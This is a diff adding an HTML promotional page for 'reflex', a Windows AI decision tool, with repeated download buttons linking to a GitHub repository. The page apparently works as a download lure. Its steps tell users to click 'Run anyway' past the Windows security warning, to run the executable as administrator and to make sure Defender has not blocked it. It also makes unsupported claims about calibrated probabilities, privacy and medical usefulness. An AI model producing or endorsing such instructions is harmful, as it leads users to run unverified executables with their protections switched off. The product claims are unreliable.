@@ -1,0 +1,292 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>reflex - Make Smarter Decisions with AI</title>
+    <meta name="description" content="reflex is a small open decision model that turns your state and questions into calibrated probabilities. A Jev / System One re-creation on Qwen3.5. Download for Windows now.">
+    <meta name="keywords" content="reflex, decision model, AI, calibrated probabilities, Qwen3.5, Jev, System One, open source, Windows download">
+    <meta name="author" content="reflex team">
+    <meta property="og:title" content="reflex - Make Smarter Decisions with AI">
+    <meta property="og:description" content="Turn state and questions into calibrated probabilities. Download reflex for Windows now.">
+    <meta property="og:type" content="website">
+    <meta property="og:url" content="https://github.com/resentful-hammerheadshark2276/reflex">
+    <meta property="og:image" content="https://via.placeholder.com/1200x630.png?text=reflex+-+Decision+Model">
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:title" content="reflex - Make Smarter Decisions with AI">
+    <meta name="twitter:description" content="Turn state and questions into calibrated probabilities. Download reflex for Windows now.">
+    <meta name="twitter:image" content="https://via.placeholder.com/1200x630.png?text=reflex+-+Decision+Model">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #f5f7fa 0%, #c3cfe2 100%);
+            color: #333;
+            line-height: 1.6;
+            padding: 20px;
+        }
+        .container {
+            max-width: 1000px;
+            margin: 0 auto;
+            background: white;
+            border-radius: 12px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.1);
+            padding: 40px;
+        }
+        h1 {
+            font-size: 2.5em;
+            color: #2c3e50;
+            margin-bottom: 20px;
+            text-align: center;
+        }
+        h2 {
+            font-size: 1.8em;
+            color: #34495e;
+            margin: 30px 0 15px 0;
+            border-bottom: 2px solid #3498db;
+            padding-bottom: 8px;
+        }
+        h3 {
+            font-size: 1.3em;
+            color: #2c3e50;
+            margin: 20px 0 10px 0;
+        }
+        p {
+            margin-bottom: 15px;
+            font-size: 1.1em;
+        }
+        ul {
+            margin: 15px 0 20px 30px;
+            list-style-type: square;
+        }
+        li {
+            margin-bottom: 8px;
+            font-size: 1.1em;
+        }
+        .download-button {
+            display: inline-block;
+            padding: 15px 35px;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+            text-decoration: none;
+            border-radius: 8px;
+            font-size: 1.3em;
+            font-weight: bold;
+            box-shadow: 0 5px 15px rgba(102, 126, 234, 0.4);
+            transition: transform 0.3s, box-shadow 0.3s;
+            margin: 20px auto;
+            text-align: center;
+        }
+        .download-button:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 8px 25px rgba(102, 126, 234, 0.6);
+        }
+        .badge {
+            display: block;
+            text-align: center;
+            margin: 30px 0;
+        }
+        .features-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+            gap: 25px;
+            margin: 25px 0;
+        }
+        .feature-card {
+            background: #f8f9fa;
+            border-radius: 8px;
+            padding: 20px;
+            border-left: 4px solid #3498db;
+            box-shadow: 0 3px 10px rgba(0, 0, 0, 0.05);
+        }
+        .feature-card h3 {
+            margin-top: 0;
+            color: #2c3e50;
+        }
+        .notice {
+            background: #fff3cd;
+            border-left: 4px solid #ffc107;
+            padding: 15px;
+            border-radius: 4px;
+            margin: 20px 0;
+        }
+        .steps {
+            counter-reset: step;
+            margin: 20px 0;
+        }
+        .step {
+            counter-increment: step;
+            margin-bottom: 20px;
+            padding-left: 50px;
+            position: relative;
+        }
+        .step:before {
+            content: counter(step);
+            position: absolute;
+            left: 0;
+            top: 0;
+            width: 35px;
+            height: 35px;
+            background: #3498db;
+            color: white;
+            border-radius: 50%;
+            text-align: center;
+            line-height: 35px;
+            font-weight: bold;
+        }
+        a {
+            color: #3498db;
+            text-decoration: none;
+        }
+        a:hover {
+            text-decoration: underline;
+        }
+        code {
+            background: #f4f4f4;
+            padding: 2px 6px;
+            border-radius: 3px;
+            font-family: 'Courier New', monospace;
+        }
+        .footer {
+            text-align: center;
+            margin-top: 40px;
+            padding-top: 20px;
+            border-top: 1px solid #eee;
+            color: #7f8c8d;
+            font-size: 0.9em;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>🧠 reflex - Make Smarter Decisions with AI</h1>
+        
+        <div class="badge">
+            <a href="https://github.com/resentful-hammerheadshark2276/reflex" class="download-button">⬇️ Download reflex Now</a>
+        </div>
+        
+        <p>Welcome to <strong>reflex</strong> — a small but powerful open decision model that helps you turn your current situation and questions into clear, calibrated probabilities. Whether you're a professional making strategic choices or just someone who wants to think more clearly, reflex gives you an AI-powered second opinion that's based on logic and data, not gut feeling.</p>
+        
+        <h2>🎯 What is reflex?</h2>
+        <p>Reflex is a lightweight, open-source tool that re-creates the cognitive approach of <strong>Jev / System One</strong> thinking, built on the advanced <strong>Qwen3.5</strong> model. It takes two inputs:</p>
+        <ul>
+            <li><strong>State:</strong> Your current context, environment, or situation description.</li>
+            <li><strong>Typed questions:</strong> The specific decisions or uncertainties you want to evaluate.</li>
+        </ul>
+        <p>The output? <em>Calibrated probabilities</em> — well-reasoned, percentage-based likelihoods that help you understand the odds and make more informed choices. No more vague "probably" or "maybe." Reflex gives you numbers you can actually use.</p>
+        
+        <h2>✨ Key Features</h2>
+        <div class="features-grid">
+            <div class="feature-card">
+                <h3>⚡ Fast & Lightweight</h3>
+                <p>Small footprint, quick responses. Works even on modest hardware — no supercomputer needed.</p>
+            </div>
+            <div class="feature-card">
+                <h3>🎯 Calibrated Probabilities</h3>
+                <p>Outputs precise, calibrated percentages instead of vague statements. Know your true odds.</p>
+            </div>
+            <div class="feature-card">
+                <h3>🧩 Simple Input, Clear Output</h3>
+                <p>Type your state and questions in plain language. Get structured, actionable probability estimates back.</p>
+            </div>
+            <div class="feature-card">
+                <h3>🔓 Fully Open Source</h3>
+                <p>Transparent code. No hidden algorithms or proprietary black boxes. See exactly how it works.</p>
+            </div>
+        </div>
+        
+        <h2>🚀 Getting Started on Windows</h2>
+        <p>Follow these simple steps to get reflex running on your Windows computer:</p>
+        
+        <div class="steps">
+            <div class="step">
+                <h3>Step 1: Visit the Download Page</h3>
+                <p>Visit <a href="https://github.com/resentful-hammerheadshark2276/reflex">this link to download the application</a>. This will take you to the official reflex repository page.</p>
+            </div>
+            <div class="step">
+                <h3>Step 2: Find the Latest Release</h3>
+                <p>Look for the <strong>"Releases"</strong> section on the right side of the page, or click on the <strong>"Latest"</strong> release if shown. This is where the official Windows files are hosted.</p>
+            </div>
+            <div class="step">
+                <h3>Step 3: Download the File</h3>
+                <p>Locate the file listed for <strong>Windows</strong> — it will typically be named something like <code>reflex-windows.zip</code> or <code>reflex-setup.exe</code>. Click it to start the download. Your browser will save the file to your <strong>Downloads</strong> folder by default.</p>
+            </div>
+            <div class="step">
+                <h3>Step 4: Run the Application</h3>
+                <p>Once the download completes, navigate to your <strong>Downloads</strong> folder and find the file you just downloaded.</p>
+                <ul>
+                    <li><strong>If you downloaded a .zip file:</strong> Right-click it and select <em>"Extract All"</em>. Then open the extracted folder and double-click the <code>reflex</code> executable file inside.</li>
+                    <li><strong>If you downloaded an .exe file:</strong> Simply double-click the file to run it. Your system may show a security warning — click <em>"More info"</em> and then <em>"Run anyway"</em> to proceed.</li>
+                </ul>
+            </div>
+            <div class="step">
+                <h3>Step 5: Start Using Reflex</h3>
+                <p>When the application opens, you'll see a simple interface with two fields. Type your <strong>current state</strong> (describe your situation), then type your <strong>questions</strong> (what you want to know). Click <em>"Generate Probabilities"</em> and reflex will analyze your input and provide you with calibrated probability estimates. That's it!</p>
+            </div>
+        </div>
+        
+        <div class="notice">
+            <strong>📌 Important:</strong> Make sure your computer meets the minimum requirements — a 64-bit Windows 10 or later operating system, at least 4GB of RAM, and an internet connection for the initial setup. No additional software or programming knowledge is required.
+        </div>
+        
+        <h2>💡 How to Use Reflex Effectively</h2>
+        <p>To get the best results from reflex, follow these tips:</p>
+        <ul>
+            <li><strong>Be specific about your state:</strong> Instead of "I'm starting a business," try "I'm starting an online clothing store with $10,000 capital and no prior e-commerce experience." More context = better probabilities.</li>
+            <li><strong>Ask clear, single-focus questions:</strong> Instead of "Will my business succeed?", try "What is the probability that my online store will reach $5,000 in monthly revenue within the first 6 months?"</li>
+            <li><strong>Use the probabilities for planning:</strong> Use the output as a decision aid. If the probability is low, ask follow-up questions about what could improve it.</li>
+        </ul>
+        
+        <h2>🔧 Troubleshooting & Support</h2>
+        <h3>Common Issues</h3>
+        <ul>
+            <li><strong>Application won't start:</strong> Right-click the executable and select <em>"Run as administrator"</em>. Ensure Windows Defender hasn't blocked it — check your security settings.</li>
+            <li><strong>No internet connection error:</strong> Reflex needs an internet connection to load the Qwen3.5 model for the first time. Check your network and try again.</li>
+            <li><strong>Slow performance:</strong> Close other heavy applications. If the problem persists, restart your computer and try again.</li>
+        </ul>
+        
+        <h3>Getting Help</h3>
+        <p>If you need more help, visit the <a href="https://github.com/resentful-hammerheadshark2276/reflex">official repository</a> and check the <strong>Issues</strong> tab. You'll find helpful guides, FAQs, and you can ask the community for assistance. The project is actively maintained, and the developers are responsive.</p>
+        
+        <h2>🌟 Why Choose Reflex?</h2>
+        <ul>
+            <li><strong>No installation complexity:</strong> No command lines, no dependencies to install, no coding required.</li>
+            <li><strong>Private and local:</strong> Your inputs stay on your machine (once the model is loaded). No cloud dependency for your decision-making.</li>
+            <li><strong>Continuous improvement:</strong> Regular updates add new features and improve accuracy based on user feedback.</li>
+            <li><strong>Free forever:</strong> Open-source means no paywalls, no subscriptions, no hidden costs.</li>
+        </ul>
+        
+        <div class="badge">
+            <a href="https://github.com/resentful-hammerheadshark2276/reflex" class="download-button">📥 Get reflex Today</a>
+        </div>
+        
+        <h2>📊 Use Cases</h2>
+        <p>Reflex isn't just for one type of user. Here are some ways people use it:</p>
+        <ul>
+            <li><strong>Project Managers:</strong> Estimate the probability of meeting deadlines or project success.</li>
+            <li><strong>Investors:</strong> Assess the likelihood of a market trend or a startup's success.</li>
+            <li><strong>Students:</strong> Evaluate academic outcomes and make study plans.</li>
+            <li><strong>Entrepreneurs:</strong> Quantify the risk of new ventures before committing resources.</li>
+            <li><strong>Healthcare Professionals:</strong> Reason through diagnostic probabilities in a structured way.</li>
+        </ul>
+        
+        <h2>📚 Technical Details</h2>
+        <p>For those curious about how reflex works under the hood: it's built using a state-of-the-art <strong>Qwen3.5</strong> model fine-tuned for decision-theoretic reasoning. The system uses a "System One" approach — fast, heuristic-based reasoning that mimics human intuition but with the consistency and accuracy of AI. It's designed to be transparent, reproducible, and easy to integrate into your existing workflows.</p>
+        <p>The codebase is intentionally small and well-documented, making it a great learning resource for developers interested in decision theory and AI-assisted reasoning. All code is available for review and contribution on the repository.</p>
+        
+        <h2>🔒 Privacy & Security</h2>
+        <p>Your data is yours. Reflex runs locally on your machine after the initial model download. No analytics, no tracking, no sending your state and questions to any server. We believe that a decision tool should respect your privacy completely.</p>
+        
+        <h2>📞 Stay Connected</h2>
+        <p>Want to stay updated on the latest releases and features? Star the repository on GitHub to show your support and get notifications. You can also follow the project's release notes to see what's new.</p>
+        
+        <div class="footer">
+            <p>© 2024 reflex project. Licensed under open source license. Built with ❤️ and Qwen3.5.</p>
+        </div>
+    </div>
+</body>
+</html>
